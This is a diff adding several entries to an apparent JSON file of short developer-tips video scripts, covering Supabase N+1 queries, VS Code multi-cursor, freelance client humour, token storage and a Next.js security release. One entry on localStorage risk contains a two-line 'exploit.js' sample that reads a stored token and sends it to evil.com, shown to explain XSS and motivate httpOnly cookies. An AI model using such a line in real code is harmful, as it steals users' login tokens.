@@ -577,5 +577,593 @@
     ],
     "slot": 3,
     "seconds": 17.2
+  },
+  {
+    "id": 36,
+    "style": "light",
+    "kicker": "Dev mistake #1",
+    "hook": "Why is your *Supabase* query so slow?",
+    "hook_word": "Supabase",
+    "points": [
+      {
+        "title": "The N+1 Trap",
+        "body": "One query fires per row not once",
+        "visual": [
+          {
+            "type": "diagram",
+            "nodes": [
+              {
+                "id": "app",
+                "label": "App",
+                "kind": "client"
+              },
+              {
+                "id": "db",
+                "label": "Database",
+                "kind": "db"
+              }
+            ],
+            "edges": [
+              {
+                "from": "app",
+                "to": "db"
+              }
+            ],
+            "flow": [
+              "app>db",
+              "app>db",
+              "app>db",
+              "app>db"
+            ]
+          },
+          {
+            "type": "diff",
+            "title": "posts.ts",
+            "language": "ts",
+            "before": "const posts = await getPosts()\nfor (const post of posts) {\n  const { data: author } =\n    await supabase\n      .from('users')\n      .select('name')\n      .eq('id', post.user_id)\n}",
+            "after": "const { data } = await supabase\n  .from('posts')\n  .select('*, users(name)')"
+          }
+        ]
+      },
+      {
+        "title": "Join In One Call",
+        "body": "Nested select joins tables in one call",
+        "visual": [
+          {
+            "type": "code",
+            "title": "posts.ts",
+            "language": "ts",
+            "code": "const { data } = await supabase\n  .from('posts')\n  .select(`\n    *,\n    users ( name, avatar )\n  `)",
+            "highlight": [
+              3,
+              4,
+              5
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Check The Query Count",
+        "body": "Explain analyze shows the real query count",
+        "visual": [
+          {
+            "type": "terminal",
+            "commands": [
+              "psql $DATABASE_URL",
+              "EXPLAIN ANALYZE SELECT * FROM posts;"
+            ]
+          }
+        ]
+      }
+    ],
+    "cta": "Comment *JOIN* for the fix",
+    "dm_keyword": "JOIN",
+    "dm_guide": "Here's the N+1 fix for Supabase. Instead of looping and querying per row, use a nested select to pull related rows through the foreign key in one call:\n\nconst { data } = await supabase.from('posts').select('*, users(name, avatar)')\n\nThat's one round trip instead of one query per row. Check the real query count with EXPLAIN ANALYZE in psql. Docs: https://supabase.com/docs/reference/javascript/select and https://www.postgresql.org/docs/current/sql-explain.html",
+    "caption": "Supabase N+1 query problem in Next.js\nOne extra query per row kills your app speed\nComment JOIN and I'll send you the full guide 👇",
+    "hashtags": [
+      "#supabase",
+      "#postgres",
+      "#nextjs",
+      "#sql"
+    ],
+    "voiceover": [
+      "[urgent] Ever wonder why one Supabase call turns into fifty?",
+      "[serious, fast] That's the N plus one trap. (break) [emphasis] One query per row, every single time.",
+      "[confident] Join the tables in one call using a nested select.",
+      "[knowing] Then check explain analyze. (break) [confident] Confirm it's really one round trip now.",
+      "[warm, curious] Comment join. (break) [excited] I'll send you the fix and the docs."
+    ],
+    "test": {
+      "name": "hook_style",
+      "arm": "question"
+    },
+    "pillar": "devtip",
+    "series": "Dev mistake",
+    "episode": 1,
+    "posted_at": "2026-09-29T12:01:14+00:00",
+    "media_id": "18045482657817263",
+    "shown": [
+      "word",
+      "diagram",
+      "code",
+      "terminal",
+      "text"
+    ],
+    "slot": 1,
+    "seconds": 21.2
+  },
+  {
+    "id": 37,
+    "style": "dark",
+    "kicker": "POV #1",
+    "hook": "Every client swears it's *just one* tiny change",
+    "points": [
+      {
+        "title": "Quick fix request",
+        "body": "Client asks for a tiny tweak",
+        "visual": [
+          {
+            "type": "chat",
+            "messages": [
+              {
+                "from": "client",
+                "text": "Just a tiny change, should be quick right"
+              },
+              {
+                "from": "me",
+                "text": "Sure, what is it"
+              },
+              {
+                "from": "client",
+                "text": "Make it look like Amazon but simpler"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Scope creeps in",
+        "body": "Small ask turns into a rebuild",
+        "visual": [
+          {
+            "type": "tweet",
+            "text": "Every quick fix request has at least three hidden features waiting inside it."
+          }
+        ]
+      },
+      {
+        "title": "Invoice conversation dread",
+        "body": "Nobody wants to send that invoice",
+        "visual": [
+          {
+            "type": "tweet",
+            "text": "The scariest sentence in freelancing: so how much extra will this cost"
+          }
+        ]
+      }
+    ],
+    "cta": "What's your worst *scope creep* story?",
+    "caption": "Every freelancer's favorite lie: it's just a small change\nTag a dev who's heard this before\nWhat's the worst quick fix you got asked for?👇",
+    "hashtags": [
+      "#freelancedev",
+      "#devlife",
+      "#clientwork",
+      "#scopecreep"
+    ],
+    "voiceover": [
+      "[grinning, punchy] They always say it's a five minute fix.",
+      "[knowing] You already know that message is never actually quick.",
+      "[exasperated] (break) Then somehow the ask turns into three new features.",
+      "[deadpan] And nobody wants to type out that final invoice.",
+      "[warm, curious] So what's the smallest ask that blew up on you."
+    ],
+    "test": {
+      "name": "hook_style",
+      "arm": "statement"
+    },
+    "pillar": "relatable",
+    "series": "POV",
+    "episode": 1,
+    "posted_at": "2026-09-29T16:00:44+00:00",
+    "media_id": "18009559832979050",
+    "shown": [
+      "text",
+      "chat",
+      "tweet",
+      "tweet",
+      "text"
+    ],
+    "slot": 2,
+    "seconds": 16.7
+  },
+  {
+    "id": 38,
+    "style": "light",
+    "kicker": "Quick trick #2",
+    "hook": "Still renaming *variables* one line at a time?",
+    "points": [
+      {
+        "title": "Select next match",
+        "body": "Ctrl D grabs the next match",
+        "visual": [
+          {
+            "type": "code",
+            "title": "app.ts",
+            "language": "ts",
+            "code": "const userName = \"alex\";\nconsole.log(userName);\nsendWelcome(userName);",
+            "highlight": [
+              1,
+              2,
+              3
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Edit all at once",
+        "body": "One edit updates every match",
+        "visual": [
+          {
+            "type": "diff",
+            "title": "app.ts",
+            "language": "ts",
+            "before": "const usrName = \"alex\";\nconsole.log(usrName);\nsendWelcome(usrName);",
+            "after": "const userName = \"alex\";\nconsole.log(userName);\nsendWelcome(userName);"
+          }
+        ]
+      },
+      {
+        "title": "Skip find and replace",
+        "body": "No dialog just instant edits"
+      }
+    ],
+    "cta": "Comment *MULTI* and I'll send you the shortcut",
+    "dm_keyword": "MULTI",
+    "dm_guide": "Here is the trick. On Windows or Linux press Control D, on Mac press Command D, with your cursor on a word. It selects the next matching word. Keep pressing to grab every match, then type once to edit them all at the same time. Press Escape to exit multi cursor mode. Works in any file, any language. Full docs from VS Code: https://code.visualstudio.com/docs/editor/codebasics#_multiple-selections-multicursor",
+    "caption": "VS Code multi cursor shortcut (Ctrl D / Cmd D)\nStop renaming variables one by one\nWhat's your favorite VS Code shortcut? 👇",
+    "hashtags": [
+      "#vscode",
+      "#codingtips",
+      "#webdev",
+      "#productivity"
+    ],
+    "voiceover": [
+      "[grinning, punchy] What if you never had to rename a variable twice?",
+      "[confident and fast] Put your cursor on it, (break) [quick] hit control d to grab every match.",
+      "[excited] Every match lights up together, (break) [emphasis] so one edit updates them all.",
+      "[knowing] No more opening find and replace or scrolling through files.",
+      "[warm, curious] Comment multi and I'll send you the full shortcut guide."
+    ],
+    "test": {
+      "name": "hook_style",
+      "arm": "question"
+    },
+    "pillar": "trick",
+    "series": "Quick trick",
+    "episode": 2,
+    "posted_at": "2026-09-29T20:01:47+00:00",
+    "media_id": "17932549161147166",
+    "shown": [
+      "text",
+      "code",
+      "diff",
+      "text",
+      "text"
+    ],
+    "slot": 3,
+    "seconds": 21.1
+  },
+  {
+    "id": 39,
+    "style": "dark",
+    "kicker": "Explained #1",
+    "hook": "Is storing your *login token* in localStorage safe?",
+    "points": [
+      {
+        "title": "Feels secure",
+        "body": "Just your own code touching it",
+        "visual": [
+          {
+            "type": "code",
+            "title": "auth.ts",
+            "language": "ts",
+            "code": "function saveToken(token: string) {\n  localStorage.setItem(\"token\", token);\n}",
+            "highlight": [
+              2
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Any script reads it",
+        "body": "One xss bug leaks everything",
+        "visual": [
+          {
+            "type": "diagram",
+            "nodes": [
+              {
+                "id": "app",
+                "label": "Your App",
+                "kind": "client"
+              },
+              {
+                "id": "store",
+                "label": "localStorage",
+                "kind": "cache"
+              },
+              {
+                "id": "xss",
+                "label": "XSS Script",
+                "kind": "cloud"
+              }
+            ],
+            "edges": [
+              {
+                "from": "app",
+                "to": "store"
+              },
+              {
+                "from": "xss",
+                "to": "store"
+              }
+            ],
+            "flow": [
+              "xss>store",
+              "store>xss"
+            ]
+          },
+          {
+            "type": "code",
+            "title": "exploit.js",
+            "language": "js",
+            "code": "const t = localStorage.getItem('tok');\nfetch('https://evil.com', {body: t});",
+            "highlight": [
+              1,
+              2
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Use httpOnly cookies",
+        "body": "JavaScript cannot read those cookies",
+        "visual": [
+          {
+            "type": "diff",
+            "title": "server.js",
+            "language": "js",
+            "before": "res.cookie(\"token\", token);",
+            "after": "res.cookie(\"token\", token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: \"strict\"\n});"
+          }
+        ]
+      }
+    ],
+    "cta": "Comment *TOKENS* for the safer setup.",
+    "dm_keyword": "TOKENS",
+    "dm_guide": "Skip localStorage for auth tokens, any XSS bug can read it instantly. Use an httpOnly cookie instead. Server side, set it like this: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/. That header blocks JavaScript from ever touching the cookie. Pair it with a short expiry and refresh token rotation, and keep SameSite set to Strict or Lax to help with CSRF too. Docs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies and https://owasp.org/www-community/HttpOnly",
+    "caption": "localStorage vs httpOnly cookies for auth tokens\nOne XSS bug can leak everything sitting in localStorage\nWhere do you store your tokens? 👇",
+    "hashtags": [
+      "#webdev",
+      "#xss",
+      "#javascript",
+      "#websecurity"
+    ],
+    "voiceover": [
+      "[urgent] Quick question, is your login token sitting in localStorage?",
+      "[knowing] It looks harmless since nothing else seems to touch it.",
+      "[serious, fast] But one xss bug lets any script read it.",
+      "[confident and fast] Httponly cookies fix that, javascript simply cannot touch them.",
+      "[warm, curious] Comment tokens and I will send you the safer setup."
+    ],
+    "test": {
+      "name": "hook_style",
+      "arm": "question"
+    },
+    "pillar": "concept",
+    "series": "Explained",
+    "episode": 1,
+    "posted_at": "2026-09-30T12:01:06+00:00",
+    "media_id": "18118775302941558",
+    "shown": [
+      "text",
+      "code",
+      "diagram",
+      "diff",
+      "text"
+    ],
+    "slot": 1,
+    "seconds": 19.3
+  },
+  {
+    "id": 40,
+    "style": "light",
+    "kicker": "Client vs Me #2",
+    "hook": "Which client phrase should make you *nervous*?",
+    "hook_word": "nervous",
+    "points": [
+      {
+        "title": "Unlimited revisions",
+        "body": "No scope, no finish line",
+        "visual": [
+          {
+            "type": "chat",
+            "messages": [
+              {
+                "from": "client",
+                "text": "So this includes unlimited revisions right?"
+              },
+              {
+                "from": "me",
+                "text": "Let's define what unlimited actually means"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Pay after launch",
+        "body": "You carry all the risk",
+        "visual": [
+          {
+            "type": "chat",
+            "messages": [
+              {
+                "from": "client",
+                "text": "I'll pay you once the site is live"
+              },
+              {
+                "from": "me",
+                "text": "We need a signed contract first then"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "title": "One small add-on",
+        "body": "Feature creep in disguise",
+        "visual": [
+          {
+            "type": "chat",
+            "messages": [
+              {
+                "from": "client",
+                "text": "Can you also just add one small thing"
+              },
+              {
+                "from": "me",
+                "text": "Sure, I'll scope that as new work"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "cta": "Which *red flag* have you heard?",
+    "caption": "Freelance client red flags in chat messages\nEvery freelancer has heard at least one of these\nWhich one have you heard before? 👇",
+    "hashtags": [
+      "#freelance",
+      "#freelancing",
+      "#clientwork",
+      "#redflags",
+      "#webdevelopment"
+    ],
+    "voiceover": [
+      "[exasperated] Some client phrases should make every freelancer nervous.",
+      "[knowing] Without a revision limit, the project just never actually ends.",
+      "[serious, fast] Holding payment until launch shifts all the risk onto you.",
+      "[deadpan] And one small add on is never just one thing.",
+      "[warm, curious] Which one of these have you heard before?"
+    ],
+    "test": {
+      "name": "hook_style",
+      "arm": "question"
+    },
+    "pillar": "freelance",
+    "series": "Client vs Me",
+    "episode": 2,
+    "posted_at": "2026-09-30T16:00:47+00:00",
+    "media_id": "18635766520024580",
+    "shown": [
+      "word",
+      "chat",
+      "chat",
+      "chat",
+      "text"
+    ],
+    "slot": 2,
+    "seconds": 17.3
+  },
+  {
+    "id": 41,
+    "style": "dark",
+    "kicker": "Patch now",
+    "hook": "Your Next js dev server leaks *source code*",
+    "points": [
+      {
+        "title": "Image optimization SSRF bug",
+        "body": "Allow-listed remote URLs hit private IPs",
+        "visual": [
+          {
+            "type": "screenshot",
+            "url": "https://github.com/vercel/next.js/security/advisories/GHSA-cjq9-62q9-8jv4",
+            "find": "Server-Side Request Forgery"
+          },
+          {
+            "type": "terminal",
+            "commands": [
+              "npm install next@16.3.8"
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Self-hosted cache poisoning",
+        "body": "SSG/ISR pages can serve wrong content",
+        "visual": [
+          {
+            "type": "screenshot",
+            "url": "https://github.com/vercel/next.js/security/advisories/GHSA-4jqv-mc3x-m676",
+            "find": "Cache poisoning"
+          }
+        ]
+      },
+      {
+        "title": "Dev server MCP leak",
+        "body": "Malicious site reads code, paths, logs",
+        "visual": [
+          {
+            "type": "screenshot",
+            "url": "https://github.com/vercel/next.js/security/advisories/GHSA-39w2-rjm5-chcv",
+            "find": "Model Context Protocol"
+          },
+          {
+            "type": "terminal",
+            "commands": [
+              "npm install next@16.3.8"
+            ]
+          }
+        ]
+      }
+    ],
+    "cta": "Comment *PATCH* for the fix commands",
+    "dm_keyword": "PATCH",
+    "dm_guide": "Next.js patched 7 bugs in the September 2026 security release (v16.3.8 / v15.5.27). Update now:\nnpm install next@16.3.8   (Next 16.3)\nnpm install next@15.5.27  (Next 15.5)\nHighlights: SSRF in Image Optimization, cache poisoning on self-hosted SSG/ISR pages, and an info leak in next dev's MCP endpoint (exposes source code snippets, file paths and logs to any site you visit while the dev server runs). Full advisory: https://nextjs.org/blog/september-2026-security-release",
+    "caption": "Next.js September 2026 security release\nSeven bugs patched, one leaks source code straight from your dev server\nHave you updated yet? 👇",
+    "hashtags": [
+      "#nextjs",
+      "#vercel",
+      "#webdev",
+      "#cybersecurity"
+    ],
+    "voiceover": [
+      "[alarmed, fast] Your Next js dev server might leak your code.",
+      "[serious, fast] One bug tricks your image loader into hitting private networks.",
+      "[urgent] Another can poison self-hosted page caches with the wrong content.",
+      "[tense] Worst bug, the dev server's M C P endpoint (break) [urgent] can expose code and paths to any site you visit.",
+      "[warm, curious] Comment patch and get the upgrade guide."
+    ],
+    "test": {
+      "name": "hook_style",
+      "arm": "statement"
+    },
+    "pillar": "timely",
+    "sources": [
+      "https://nextjs.org/blog/september-2026-security-release",
+      "https://github.com/vercel/next.js/security/advisories/GHSA-cjq9-62q9-8jv4",
+      "https://github.com/vercel/next.js/security/advisories/GHSA-4jqv-mc3x-m676",
+      "https://github.com/vercel/next.js/security/advisories/GHSA-39w2-rjm5-chcv"
+    ],
+    "posted_at": "2026-09-30T20:00:50+00:00",
+    "media_id": "18139437865621805",
+    "shown": [
+      "text",
+      "screenshot",
+      "screenshot",
+      "screenshot",
+      "text"
+    ],
+    "slot": 3,
+    "seconds": 22.6
   }
 ]
